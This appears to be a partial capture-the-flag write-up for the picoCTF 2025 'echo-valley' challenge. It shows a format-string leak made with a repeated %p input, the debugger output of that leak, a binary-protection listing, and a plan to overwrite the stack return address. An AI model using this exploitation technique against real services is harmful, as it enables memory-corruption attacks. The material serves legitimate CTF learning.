### In GDB
%p - 0x5555555560c1
main - 0x555555555409
return_addr - 0x7fffffffe2a8
stack_addr - 0x7ffff7f9ca00

```
(lldb) continue
Process 564758 resuming
Welcome to the Echo Valley, Try Shouting: 
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
You heard in the distance: 0x5555555560c1|(nil)|0x7ffff7f9ca00|(nil)|0x5555555596b0|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0xa7c70257c|(nil)|(nil)|0xf7a5753e67c48200|0x7fffffffe2d0|0x555555555413|0x1|0x7ffff7dafd90|(nil)|0x555555555401|0x100000000|0x7fffffffe3e8|(nil)|
exit
The Valley Disappears
Process 564758 stopped
* thread #1, name = 'valley', stop reason = breakpoint 2.1
    frame #0: 0x0000555555555400 valley`echo_valley at valley.c:43:1
(lldb) mem read $rsp
0x7fffffffe2c8: 13 54 55 55 55 55 00 00 01 00 00 00 00 00 00 00  .TUUUU..........
0x7fffffffe2d8: 90 fd da f7 ff 7f 00 00 00 00 00 00 00 00 00 00  ................
(lldb) exit
```

### In Shell
%p - 0x55e8931620c1
main - 0x55e893161409

### Writeup
Obvious fmt string exploit. Start by obtaining a leak using %p.

```
[*] '/home/ctf/picoctf-2025/pwn/echo-valley/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

Full RELRO so we'll have to overwrite the return address on the stack meaning we also need a stack leak.